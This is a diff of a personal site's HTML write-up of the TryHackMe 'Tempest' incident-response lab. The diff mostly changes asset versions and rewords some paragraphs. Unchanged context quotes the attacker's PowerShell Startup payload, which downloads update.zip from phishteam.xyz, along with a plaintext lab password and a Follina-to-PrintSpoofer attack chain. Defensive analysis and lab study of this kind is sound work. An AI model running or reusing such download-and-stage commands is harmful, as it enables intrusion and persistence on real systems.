@@ -9,13 +9,14 @@
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&family=Space+Grotesk:wght@600;700;800&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="/assets/css/style.css?v=20261013b">
-  <link rel="stylesheet" href="/assets/css/premium.css?v=20261013b">
-<link rel="stylesheet" href="/assets/css/studio.css?v=20261013b">
+  <link rel="stylesheet" href="/assets/css/style.css?v=20261017">
+  <link rel="stylesheet" href="/assets/css/premium.css?v=20261017">
+<link rel="stylesheet" href="/assets/css/studio.css?v=20261017">
 <link rel="icon" href="/assets/media/favicon.svg" type="image/svg+xml">
-<meta name="theme-color" content="#0b1016">
+<meta name="theme-color" content="#121411">
+  <link rel="stylesheet" href="/assets/css/journal.css?v=20261017">
 </head>
-<body data-visual-style="editorial">
+<body data-visual-style="editorial" data-page-kind="article">
   <header class="topbar"><div class="wrap topbar-inner"><a class="brand" href="/">Thai Ngoc<span aria-hidden="true">.</span></a><nav class="nav"><a href="/">Home</a><a href="/projects/">Projects</a><a class="active" href="/writeups/">Writeups</a><a href="/achievements/">Achievements</a><a href="/contact/">Contact</a></nav></div></header>
   <main class="page tempest-page"><div class="wrap article-layout">
     <aside class="toc"><div class="toc-title">On this page</div><a href="#overview">Overview</a><a href="#analyst-mindset">SOC Mindset</a><a href="#prep">Evidence Prep</a><a href="#initial-access">Initial Access</a><a href="#follina">Follina</a><a href="#stage2">Stage 2</a><a href="#traffic">Network Traffic</a><a href="#discovery">Discovery</a><a href="#proxy">Reverse Proxy</a><a href="#privesc">Privilege Escalation</a><a href="#persistence">Persistence</a><a href="#timeline">Timeline</a><a href="#iocs">IOCs</a><a href="#mitre">MITRE ATT&CK</a><a href="#qa">Full Questions & Answers</a><a href="#remediation">Remediation</a></aside>
@@ -23,7 +24,7 @@
       <div class="breadcrumb"><a href="/">Home</a> / <a href="/writeups/">Writeups</a> / TryHackMe / Tempest</div>
       <div class="eyebrow">TryHackMe Premium · SOC / DFIR / Incident Response</div>
       <h1 class="page-title">Tempest: Thinking Like a SOC Analyst During a Full Windows Compromise</h1>
-      <p class="lead">I reconstructed the Tempest compromise from Sysmon, Windows Event Logs and a packet capture. The report follows the pivots I used and marks where the evidence supports a conclusion versus where it only supports a hypothesis.</p>
+      <p class="lead">Reconstructing the Tempest intrusion from Sysmon, Windows Security events and a PCAP, from document execution to credential access and service persistence.</p>
       <div class="info-card"><div class="item"><div class="label">Platform</div><div class="value">TryHackMe</div></div><div class="item"><div class="label">Room</div><div class="value">Tempest</div></div><div class="item"><div class="label">Category</div><div class="value accent">SOC / DFIR</div></div><div class="item"><div class="label">Artifacts</div><div class="value">Sysmon EVTX, Windows EVTX, PCAP</div></div><div class="item"><div class="label">Tools</div><div class="value">EvtxECmd, Timeline Explorer, Brim, Wireshark, CyberChef</div></div><div class="item"><div class="label">Core chain</div><div class="value">Document → SYSTEM persistence</div></div></div>
       <div class="callout"><strong>Case objective:</strong> reconstruct the attack from initial access to persistence using endpoint logs, network traffic, decoded payloads, and Windows security events.</div>
 
@@ -34,11 +35,11 @@
       <div class="flow"><pre><code>free_magicules.doc → WINWORD.EXE → MSDT/Follina → Startup payload → first.exe → HTTP C2 → credential discovery → Chisel SOCKS → WinRM → PrintSpoofer → final.exe → accounts + service persistence</code></pre></div>
 
       <h2 id="analyst-mindset">SOC Analyst Mindset</h2>
-      <p>When I investigate a case like this, I try not to jump directly to the final answer. A SOC analyst's job is to explain why something is suspicious and prove the path the attacker took. My thinking during this room was:</p>
+      <p>I organized the investigation around the following checks, keeping each proposed step tied to an artifact:</p>
       <ul class="step-list"><li><strong>Start from a known entry point.</strong> The scenario mentioned a malicious document, so the first question was: which document, which user, and did it actually execute?</li><li><strong>Do not trust one event alone.</strong> A file path can be misleading. I wanted process creation, DNS, PCAP, and decoded payload evidence to line up.</li><li><strong>Follow cause and effect.</strong> If Word launched MSDT, then I checked what MSDT executed. If a payload wrote into Startup, then I checked what ran after login. If a C2 channel returned command output, I decoded it and asked what attacker goal it supported.</li><li><strong>Think in attacker objectives.</strong> Initial access was not the end. I looked for staging, discovery, credential access, tunneling, privilege escalation, and persistence.</li><li><strong>Write evidence as a story.</strong> The final report should let another analyst reproduce my reasoning without needing to guess what I saw.</li></ul>
 
       <h2 id="prep">1. Evidence Preparation</h2>
-      <p>I started with the hashes of the provided artifacts. This is not glamorous, but it gives confidence that the evidence being analyzed is the expected evidence. In a real SOC or DFIR case, this helps with chain of custody and repeatability.</p>
+      <p>I recorded the supplied artifact hashes before parsing the logs. They provide a reference for checking that later analysis uses the same files.</p>
       <figure class="evidence-shot"><figcaption><span>Evidence 01</span><span>Artifact SHA256 verification</span></figcaption><img loading="lazy" decoding="async" src="/assets/media/writeups/tryhackme/tempest/01-artifact-sha256-verification.png" alt="SHA256 hashes of Tempest artifacts"></figure>
       <pre><code>capture.pcapng  CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6
 sysmon.evtx     665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F
@@ -70,7 +71,7 @@ cd "$app\Microsoft\Windows\Start Menu\Programs\Startup";
 iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip;
 Expand-Archive .\update.zip -DestinationPath .;
 rm update.zip;</code></pre>
-      <p>This told me the exploit was not only executing code once. It was preparing persistence through the Startup folder so another command would run after the user logged in.</p>
+      <p>The Startup-folder write provides a persistence lead to check against the next logon and process activity.</p>
 
       <h2 id="stage2">4. Stage 2: Startup Execution and first.exe</h2>
       <p>After decoding the Startup payload, I expected to find a later execution chain with <code>explorer.exe</code> as the parent process because user Startup folder items normally run after login under the user's session.</p>
@@ -186,11 +187,12 @@ $pass = "infernotempest"</code></pre>
       <h2 id="remediation">Remediation Recommendations</h2>
       <ul class="step-list"><li>Isolate the Tempest workstation and preserve forensic artifacts before reimaging.</li><li>Reset <code>benimaru</code>'s password and remove attacker-created users <code>shion</code> and <code>shuna</code>.</li><li>Remove malicious files including <code>first.exe</code>, <code>ch.exe</code>, <code>spf.exe</code>, and <code>C:\ProgramData\final.exe</code>.</li><li>Delete the <code>TempestUpdate2</code> service and inspect Startup folder entries.</li><li>Block or monitor <code>phishteam.xyz</code>, <code>resolvecyber.xyz</code>, <code>167.71.199.191</code>, and the observed HTTP paths.</li><li>Harden WinRM access and restrict port <code>5985</code> to trusted administration hosts.</li><li>Audit scripts and configuration files for plaintext credentials.</li><li>Create detections for <code>msdt.exe ms-msdt:</code>, <code>certutil -urlcache</code>, Chisel <code>R:socks</code>, PrintSpoofer execution, and suspicious <code>sc.exe create</code> commands.</li></ul>
       <h2>Conclusion</h2>
-      <p>The case became clear only after the endpoint and network evidence were joined. Sysmon established the process and command-line chain, the PCAP exposed the C2 protocol, and Windows Security events confirmed the account and group changes. Together they supported the sequence from document execution to C2, credential discovery, WinRM access, privilege escalation and service persistence.</p>
+      <p>Sysmon records the process and command sequence, the PCAP exposes the C2 exchanges, and Windows Security events confirm account and group changes. Together they support the timeline from document execution to credential use, WinRM access, privilege escalation and service persistence.</p>
     </article>
   </div></main>
-  <script src="/assets/js/main.js?v=20261013b"></script><script>function initCyberBackground(){const prefersReducedMotion=window.matchMedia("(prefers-reduced-motion: reduce)").matches;removeOldBackgrounds();document.body.classList.remove("writeups-bg-mode");document.body.classList.add("home-bg-mode");if(prefersReducedMotion||window.innerWidth<=760)return;initHomeBackground(false);}</script>
-<script src="/assets/js/premium.js?v=20261013b"></script>
-<script src="/assets/js/studio.js?v=20261013b"></script>
+  <script src="/assets/js/main.js?v=20261017"></script><script>function initCyberBackground(){const prefersReducedMotion=window.matchMedia("(prefers-reduced-motion: reduce)").matches;removeOldBackgrounds();document.body.classList.remove("writeups-bg-mode");document.body.classList.add("home-bg-mode");if(prefersReducedMotion||window.innerWidth<=760)return;initHomeBackground(false);}</script>
+<script src="/assets/js/premium.js?v=20261017"></script>
+<script src="/assets/js/studio.js?v=20261017"></script>
+  <script src="/assets/js/journal.js?v=20261017"></script>
 </body>
 </html>
